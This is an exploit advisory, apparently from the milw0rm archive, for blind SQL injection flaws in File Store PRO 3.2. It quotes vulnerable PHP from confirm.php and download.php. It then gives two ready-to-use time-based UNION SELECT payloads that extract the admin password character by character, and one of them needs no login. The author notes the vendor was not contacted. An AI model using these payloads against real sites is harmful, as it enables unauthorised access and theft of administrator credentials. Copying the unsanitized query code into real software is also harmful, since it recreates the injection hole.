<html><head><title>File Store PRO 3.2 Multiple Blind SQL Injection Vulnerabilities</title></head><pre> ________________________________________
| File Store PRO 3.2 Blind SQL Injection |
|________________________________________|


Download from: http://upoint.info/cgi/demo/fs/filestore.zip

- Need admin rights:
/confirm.php:
[code]

if(isset($_GET[&quot;folder&quot;]) &amp;&amp; $_GET[&quot;folder&quot;]!=&quot;&quot;) {
 $folder=$_GET[&quot;folder&quot;];
} else {
  exit(&quot;Bad Request&quot;);
 }
if(isset($_GET[&quot;id&quot;]) &amp;&amp; $_GET[&quot;id&quot;]!=&quot;&quot;) {
 $id=$_GET[&quot;id&quot;];
} else {
  exit(&quot;Bad Request&quot;);
 }

// Validate all inputs
// Added by SepedaTua on June 01, 2006 - http://www.sepedatua.info/
/********************** SepedaTua ****************************/

/* Fields:
$folder
$id
*/
$search = array ('@&lt;script[^&gt;]*?&gt;.*?&lt;/script&gt;@si',
                '@&lt;[\/\!]*?[^&lt;&gt;]*?&gt;@si',
                '@([\r\n])[\s]+@',
                '@&amp;(quot|#34);@i',
                '@&amp;(amp|#38);@i',
                '@&amp;(lt|#60);@i',
                '@&amp;(gt|#62);@i',
                '@&amp;(nbsp|#160);@i',
                '@&amp;(iexcl|#161);@i',
                '@&amp;(cent|#162);@i',
                '@&amp;(pound|#163);@i',
                '@&amp;(copy|#169);@i',
                '@&amp;#(\d+);@e');

$replace = array ('',
                 '',
                 '\1',
                 '&quot;',
                 '&amp;',
                 '&lt;',
                 '&gt;',
                 ' ',
                 chr(161),
                 chr(162),
                 chr(163),
                 chr(169),
                 'chr(\1)');

$ffolder = $folder;
$fid = $id;

$folder = preg_replace($search, $replace, $folder);
$id = preg_replace($search, $replace, $id); 

-----

$SQL=&quot;SELECT `&quot;.DB_PREFIX.&quot;users`.*, `&quot;.DB_PREFIX.&quot;file_list`.`filename`, `&quot;.DB_PREFIX.&quot;file_list`.`descript` &quot;;
$SQL.=&quot; FROM `&quot;.DB_PREFIX.&quot;file_list` LEFT JOIN `&quot;.DB_PREFIX.&quot;users` ON `&quot;.DB_PREFIX.&quot;file_list`.`user_id`=`&quot;.DB_PREFIX.&quot;users`.`id`&quot;;
$SQL.=&quot; WHERE `&quot;.DB_PREFIX.&quot;file_list`.`id`='&quot;.$id.&quot;'&quot;;
if(!$mysql-&gt;query($SQL))
{
 exit($mysql-&gt;error);
}
if($mysql-&gt;num&lt;=0)
{
 exit(&quot;Record not found&quot;);
} 
[/code]

POC: 
' UNION SELECT IF (SUBSTRING(password, 1, 1)='a', BENCHMARK(100000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from fstore_users where login='admin 
Site: http://site.xxx/confirm.php?folder=a&amp;id=[SQL]

- Don't need admin rights:
In /download.php:
[code]
if(!isset($_GET[&quot;sig&quot;])) // direct download, no need to login
$MustLogin=1|2|4;
require_once(&quot;libs/header.php&quot;);
if(!isset($_GET[&quot;sig&quot;])) // direct download, no need to login
$userlevel=$CurUser-&gt;getlevel();
$SQL=&quot;SELECT * FROM `&quot;.DB_PREFIX.&quot;file_list` WHERE `id`='&quot;.$fileid.&quot;'&quot;;
if(!$mysql-&gt;query($SQL))
{
 exit($mysql-&gt;error);
} 
[/code]

POC:
' UNION SELECT IF (SUBSTRING(password, 1, 1)='a', BENCHMARK(100000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11 from fstore_users where login='admin
Site: 
http://site.xxx/download.php?id=[SQL] 

Needs magic_quotes_gpc=off. Vendor not contacted !

--------------------------------------------------------------------

Site: http://rstcenter.com
Site: http://de-ce.net

Good luck !

--------------------------------------------------------------------

# milw0rm.com [2008-07-11]</pre></html>